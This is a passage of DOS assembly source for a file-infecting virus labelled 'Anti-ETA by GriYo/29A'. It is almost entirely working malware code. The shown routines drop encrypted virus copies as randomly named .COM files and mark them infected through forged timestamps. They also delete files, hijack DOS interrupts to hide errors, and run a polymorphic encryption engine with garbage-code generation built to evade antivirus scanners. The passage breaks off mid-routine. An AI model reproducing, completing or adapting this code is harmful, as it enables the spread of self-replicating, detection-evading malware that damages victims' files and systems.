    db 000h,000h,001h,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FEh
    db 000h,000h,000h,000h,000h,000h,000h,000h,000h,0FFh,0FFh,0FFh,0FFh,0FFh
    db 0FFh,0FFh,0FFh,0FFh,0FFh,000h,000h,000h,000h,000h,000h,000h,000h,000h
    db 000h,07Fh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0C0h,000h,000h,000h
    db 000h,000h,000h,000h,000h,000h,000h,03Fh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh
    db 0FFh,0FEh,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,03Fh
    db 0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FCh,000h,000h,000h,000h,000h,000h
    db 000h,000h,000h,000h,000h,00Fh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FEh,000h
    db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,001h,0FFh,0FFh
    db 0FFh,0FFh,0FEh,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
    db 000h,000h,000h,000h,0FFh,0FFh,0FFh,000h,000h,000h,000h,000h,000h,000h
    db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
    db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ ID string                                                                ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

id_string       db "<< Anti-ETA by GriYo/29A >>"

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Create a virus dropper in the current directory                          ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

drop_virus:     call get_rnd
                or al,al
                jnz do_not_gen
                mov ax,cs
                mov ds,ax
                mov es,ax
                call hook_24h_03h
                mov ax,0004h
                call rand_in_range
                inc ax
                inc ax
                mov cx,ax
                mov di,offset dropper_name
                push di
                cld
generate_name:  mov ax,0019h
                call rand_in_range
                add al,41h
                stosb
                loop generate_name
                mov eax,"MOC."
                mov dword ptr ds:[di],eax
                mov dword ptr ds:[di+04h],00h
                pop dx
                mov ah,3Ch
                xor cx,cx
                int 03h
                jc exit_generator
                mov dword ptr ds:[host_type],"DROP"     ; Set host type
                mov word ptr ds:[delta],0100h           ; Save delta offset
                xchg bx,ax
                push bx
                mov si,inf_para_size*02h                ; Allocate memory
                call mem_alloc                          ; for a virus copy
                pop bx                                  ; and the virus body
                or di,di
                jz cant_drop
                push bx
                mov es,di
                xor di,di
                call gen_polymorph
                add word ptr ds:[delta],di              ; Save delta offset
                xor si,si
                mov cx,inf_byte_size
                rep movsb
                push di
                push es
                pop ds                
                call crypto03h                          ; Crypt area 03h
                call crypto02h                          ; Crypt area 02h
                call crypto01h                          ; Crypt area 01h
                call gen_encryption
                mov ah,40h                              ; Write virus
                pop cx                                  ; dropper
                pop bx
                sub dx,dx
                int 03h
                jc oh_shit
                mov ah,2Ah                              ; Get current year
                int 03h
                mov ax,cx
                sub ax,07BCh                            ; Years from 1980
                call rand_in_range
                shl al,1
                mov dh,al
                call get_rnd                            ; Get random date
                and al,0FEh
                mov dl,al
                call rand_16                            ; Get random time
                and ax,7BE0h
                or al,0Ah                               ; Mark as infected
                mov cx,ax
                mov ax,5701h
                int 03h
oh_shit:        mov ah,49h                              ; Free allocated
                int 03h                                 ; memory
                push cs                                 
                pop ds
                mov word ptr ds:[crypt_delta],0000h     ; Clear crypt delta
cant_drop:      mov ah,3Eh                              ; Close file
                int 03h
exit_generator: call free_24h_03h
do_not_gen:     jmp exit21h

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Make a copy of file header                                               ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

backup_header:  push si
                push di
                push es
                push ds
                pop es
                mov si,offset inf_header
                mov di,offset old_header
                mov cx,001Ch
                cld
                rep movsb
                pop es
                pop di
                pop si
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Seek into file routines                                                  ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

seek_begin:     xor al,al
                jmp short seek_int_21h
seek_end:       mov al,02h
seek_int_21h:   mov ah,42h
                xor cx,cx
                xor dx,dx
                int 03h
                jc seek_error
                mov word ptr cs:[file_size],ax          ; Save pointer
                mov word ptr cs:[file_size+02h],dx      ; position
                clc
                ret
seek_error:     stc
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Delete file routine                                                      ³
;³ On entry:                                                                ³
;³    DS:DX -> ptr to the file name to delete                               ³
;³    DS:SI -> ptr to directory name                                        ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

delete_file:    push ds
                pop es                                  ; Get path of next
                push si
                push di
                mov di,offset delete_path                      
                push di
                mov bx,di                               
                cld
copy_del_path:  lodsb
                stosb
                cmp al,"\"
                jne no_slash_here
                mov bx,di
no_slash_here:  or al,al
                jnz copy_del_path
                mov si,dx                               ; Now write the name
                mov di,bx                               ; of the file to delete
copy_del_name:  lodsb                                   ; next to path
                stosb
                or al,al
                jnz copy_del_name
                mov ax,4301h                            ; Wipe out the file
                xor cx,cx                               ; attribute
                pop dx
                int 03h

                mov ah,41h                              ; Delete filename
                int 03h
                pop di
                pop si
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Hook int 24h to a dummy handler and redirect int 21h over int 3          ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

hook_24h_03h:   push ax
                push bx
                push ds
                push es
                push cs
                pop ds
                mov al,03h
                call get_int
                mov word ptr ds:[old03h],bx
                mov word ptr ds:[old03h+02h],es
                mov dx,offset call21h
                call set_int
                mov al,24h
                call get_int
                mov word ptr ds:[old24h],bx
                mov word ptr ds:[old24h+02h],es
                mov dx,offset my24h
                call set_int
                pop es
                pop ds
                pop bx
                pop ax
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Restore int 24h and 3                                                    ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

free_24h_03h:   push ax
                push ds
                mov al,03h
                lds dx,dword ptr cs:[old03h]
                call set_int
                mov al,24h
                lds dx,dword ptr cs:[old24h]
                call set_int
                pop ds
                pop ax
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Virus critical error interrupt handler (int 24h)                         ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

my24h:          sti
                mov al,3                                ; Return error in
                iret                                    ; function

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Generate polymorphic encryption                                          ³
;³ On entry:                                                                ³
;³    DS    -> virus code segment                                           ³
;³    ES:DI -> position where the engine has to put the decryptor           ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

gen_polymorph:  cld
                call rand_16                            ; Get displacement
                and al,0FEh                             ; Avoid odd displace
                mov word ptr ds:[eng_displace],ax
                call rand_16                            ; Get crypt key
                mov word ptr ds:[eng_crypt_key],ax
                mov byte ptr ds:[eng_recursive],00h     ; Reset rec. counter
                cmp dword ptr ds:[host_type],".EXE"     ; 1st rnd block only
                jne skip_1st_block                      ; on EXE files
                call gen_rnd_block                      ; Block of rand data
skip_1st_block: mov word ptr ds:[eng_entry_point],di    ; Decryptor entry
                mov ax,(offset end_opcodes - offset opcodes_table)/02h
                call rand_in_range
                add ax,ax
                mov si,offset opcodes_table             ; Get pointer to
                add si,ax                               ; random reg table
                lodsw
                mov si,ax                
                call gen_garbage

                ; At this point,
                ; DS:SI -> reg opcode table+01h
                ;
                ; +00h add [bp+nn],key
                ;      rol [bp+nn],01h
                ;      inc [bp+nn]
                ; +01h sub [bp+nn],key
                ; +02h xor [bp+nn],key
                ; +03h ror [bp+nn],01h
                ;      dec [bp+nn]
                ; +04h add bp,inm
                ; +05h sub bp,inm
                ; +06h inc bp
                ; +07h cmp bp,inm

                movsb                                   ; mov reg,imm
                mov word ptr ds:[eng_init_ptr],di
                xor ax,ax
                stosw
                call gen_garbage
                mov word ptr ds:[eng_loop_point],di
                call gen_garbage
                mov al,2Eh                              ; Get segment reg
                stosb
                mov ax,(offset end_crypt - offset crypt_table)/02h
                call rand_in_range
                add ax,ax
                mov bx,offset crypt_table               ; Get pointer to
                add bx,ax                               ; crypt generator
                call word ptr ds:[bx]                   ; Gen decrypt instr
                call gen_garbage
                mov ax,(offset end_inc_ptr - offset inc_ptr_table)/02h
                call rand_in_range
                add ax,ax
                mov bx,offset inc_ptr_table             ; Get pointer to
                add bx,ax                               ; inc ptr generator
                call word ptr ds:[bx]                   ; Gen inc ptr instr
                call gen_garbage
                mov al,81h
                mov ah,byte ptr ds:[si+07h]             ; Gen cmp reg,imm
                stosw
                mov word ptr ds:[eng_cmp_ptr],di
                xor ax,ax
                stosw
                mov ax,di
                sub ax,word ptr ds:[eng_loop_point]
                cmp ax,7Fh                
                jb use_jmp_short
                mov ax,0074h                            ; Gen je label
                stosw                                   ;     garbage
                push di                                 ;     jmp loop_point
                call gen_garbage                        ;     garbage
                mov al,0E9h                             ; label:
                stosb
                mov ax,di
                sub ax,word ptr ds:[eng_loop_point]
                inc ax
                inc ax
                neg ax
                stosw
                call gen_garbage
                pop bx
                mov ax,di
                sub ax,bx
                mov byte ptr es:[bx-01h],al
                jmp short continue_gen
use_jmp_short:  inc al                                  
                inc al
                neg al
                mov ah,75h
                xchg ah,al
                stosw                                   ; Gen jne loop_point
continue_gen:   call gen_garbage
                mov al,0E9h
                stosb
                push di
                xor ax,ax
                stosw
                call gen_rnd_block                      ; Block of rand data
                pop bx
                mov ax,di
                sub ax,bx
                dec ax
                dec ax
                mov word ptr es:[bx],ax
                mov ax,di
                mov word ptr ds:[crypt_delta],ax
                add ax,word ptr ds:[delta]
                sub ax,word ptr ds:[eng_displace]
                mov bx,word ptr ds:[eng_init_ptr]       ; Ptr start of
                mov word ptr es:[bx],ax                 ; encrypted code...
                add ax,(inf_byte_size and 0FFFEh)+02h
                mov bx,word ptr ds:[eng_cmp_ptr]        ; Ptr end of
                mov word ptr es:[bx],ax                 ; encrypted code...
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Perform encryption                                                       ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

gen_encryption: mov si,word ptr cs:[crypt_delta]
                mov di,si
                mov cx,(inf_byte_size+01h)/02h
                mov dx,word ptr cs:[eng_crypt_key]
loop_do_crypt:  lodsw
                db 0EBh,00h                             ; Clear prefetch
crypt_reverse   dw 9090h                                ; Crypt/decrypt
                stosw
                loop loop_do_crypt
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Generate random data block                                               ³
;³ On entry to rnd_fill_loop:                                               ³
;³    ES:DI -> buffer to be filled                                          ³
;³    CX    -> buffer size in bytes                                         ³
;³    Warning: direction flag must be clear                                 ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

gen_rnd_block:  mov ax,004Bh                            ; Generate a block of
                call rand_in_range                      ; random data
                add ax,0019h                            
                mov cx,ax

rnd_fill_loop:  call get_rnd
                stosb
                loop rnd_fill_loop
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Do encryption with add instruction                                       ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

crypt_add:      mov al,81h
                mov ah,byte ptr ds:[si]
                stosw
                mov ax,word ptr ds:[eng_displace]       ; Disp
                stosw
                mov ax,word ptr ds:[eng_crypt_key]      ; Key
                stosw
                mov ds:[crypt_reverse],0C22Bh           ; sub ax,dx
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Do encryption with sub instruction                                       ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

crypt_sub:      mov al,81h
                mov ah,byte ptr ds:[si+01H]
                stosw
                mov ax,word ptr ds:[eng_displace]       ; Disp
                stosw
                mov ax,word ptr ds:[eng_crypt_key]      ; Key
                stosw
                mov ds:[crypt_reverse],0C203h           ; add ax,dx
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Do encryption with xor instruction                                       ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

crypt_xor:      mov al,81h
                mov ah,byte ptr ds:[si+02h]
                stosw
                mov ax,word ptr ds:[eng_displace]       ; Disp
                stosw
                mov ax,word ptr ds:[eng_crypt_key]      ; Key
                stosw
                mov ds:[crypt_reverse],0C233h           ; xor ax,dx
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Do encryption with rol instruction                                       ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

crypt_rol:      mov al,0D1h
                mov ah,byte ptr ds:[si]
                stosw
                mov ax,word ptr ds:[eng_displace]       ; Disp
                stosw
                mov ds:[crypt_reverse],0C8D1h           ; ror ax,dx
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Do encryption with ror instruction                                       ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

crypt_ror:      mov al,0D1h
                mov ah,byte ptr ds:[si+03h]
                stosw
                mov ax,word ptr ds:[eng_displace]       ; Disp
                stosw
                mov ds:[crypt_reverse],0C0D1h           ; sub ax,dx
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Do encryption with inc instruction                                       ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

crypt_inc:      mov al,0FFh
                mov ah,byte ptr ds:[si]
                stosw
                mov ax,word ptr ds:[eng_displace]       ; Disp
                stosw
                mov ds:[crypt_reverse],9048h            ; dec ax
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Do encryption with dec instruction                                       ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

crypt_dec:      mov al,0FFh
                mov ah,byte ptr ds:[si+03h]
                stosw
                mov ax,word ptr ds:[eng_displace]       ; Disp
                stosw
                mov ds:[crypt_reverse],9040h            ; inc ax
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Inc pointer reg using add reg,0002h                                      ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

ptr_add0002h:   mov al,83h
                mov ah,byte ptr ds:[si+04h] 
                stosw
                mov al,02h
                stosb
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Inc pointer reg using sub reg,FFFEh                                      ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

ptr_subFFFEh:   mov al,83h
                mov ah,byte ptr ds:[si+05h]
                stosw
                mov al,0FEh
                stosb
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Inc pointer reg using inc reg + garbage + inc reg                        ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

ptr_inc_inc:    call gen_inc_reg
                call gen_garbage
                call gen_inc_reg
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Inc pointer reg using inc reg + garbage + add reg,0001h                  ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

ptr_inc_add:    call gen_inc_reg
                call gen_garbage
                call gen_add_0001h
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Inc pointer reg using add reg,0001h + garbage + inc reg                  ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

ptr_add_inc:    call gen_add_0001h
                call gen_garbage
                call gen_inc_reg
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Inc pointer reg using inc reg + garbage + sub reg,FFFFh                  ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

ptr_inc_sub:    call gen_inc_reg
                call gen_garbage
                call gen_sub_FFFFh
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Inc pointer reg using sub reg,FFFFh + garbage + inc reg                  ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

ptr_sub_inc:    call gen_sub_FFFFh
                call gen_garbage
                call gen_inc_reg
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Inc pointer reg using add reg,0001h + garbage + add reg,0001h            ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

ptr_add_add:    call gen_add_0001h
                call gen_garbage
                call gen_add_0001h
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Inc pointer reg using sub reg,FFFFh + garbage + sub reg,FFFFh            ³
